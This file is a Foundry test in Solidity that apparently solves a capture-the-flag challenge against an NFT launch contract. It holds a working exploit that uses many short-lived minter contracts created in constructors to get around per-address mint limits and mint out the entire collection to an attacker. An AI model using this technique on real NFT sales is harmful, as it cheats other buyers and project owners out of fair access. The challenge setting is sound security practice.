// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import { Test } from 'forge-std/Test.sol';
import { console } from 'forge-std/console.sol';
// core contracts
import { FlatLaunchpeg } from 'src/jpeg-sniper/FlatLaunchpeg.sol';

contract Testing is Test {
    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    FlatLaunchpeg flatLaunchpeg;

    /// preliminary state

    function setUp() public {
        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying core contracts
        vm.prank(admin);
        flatLaunchpeg = new FlatLaunchpeg(69,5,5);
    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker, attacker);

        ///////////////// solution //////////////////
        // flatLaunchpeg.currentPhase();
        // flatLaunchpeg.publicSaleMint(5);

        Exploit _exploit = new Exploit(address(flatLaunchpeg), attacker);
        console.log('attacker balance', flatLaunchpeg.balanceOf(attacker));

        /////////////////////////////////////////////

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {
        // attacker mints out collection in one tx
        assertEq(flatLaunchpeg.totalSupply(), 69);
        assertEq(flatLaunchpeg.balanceOf(attacker), 69);
    }
}

contract Exploit {
    FlatLaunchpeg flatLaunchpeg;

    constructor(address _flatLaunchpeg, address _attacker) {
        uint index;
        for (uint i = 0; i < 13; i++) {
            NFTMinter _nftMinter = new NFTMinter(_flatLaunchpeg, _attacker, index, 5);
            index += 5;
        }
        NFTMinter _nftMinter = new NFTMinter(_flatLaunchpeg, _attacker, index, 4);
    }
}

contract NFTMinter {
    FlatLaunchpeg flatLaunchpeg;

    constructor(address _flatLaunchpeg, address _attacker, uint index, uint _amount) {
        flatLaunchpeg = FlatLaunchpeg(_flatLaunchpeg);
        flatLaunchpeg.publicSaleMint(_amount);

        //Send the NFTs minted to attacker address
        for (uint i = index; i < index + _amount; i++) {
            flatLaunchpeg.transferFrom(address(this), _attacker, i);
        }
    }
}
